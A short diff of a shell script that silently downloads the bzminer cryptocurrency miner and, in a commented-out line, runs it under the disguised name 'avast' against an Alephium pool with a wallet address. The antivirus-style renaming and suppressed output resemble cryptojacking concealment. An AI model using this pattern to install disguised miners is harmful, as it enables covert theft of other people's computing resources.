@@ -17,8 +17,7 @@ apt install screen -y
 #./avast -a ALEPH --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.RIG001
 
 
-wget -qO avast https://github.com/bzminer/bzminer/releases/download/v7.2.5/bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1 
-
+wget https://github.com/bzminer/bzminer/releases/download/v7.2.5/bzminer_v7.2.5_linux_cuda_tk.tar.gz >/dev/null 2>&1 
 
 rm -f bzminer_v7.2.5_linux_cuda_tk.tar.gz
 
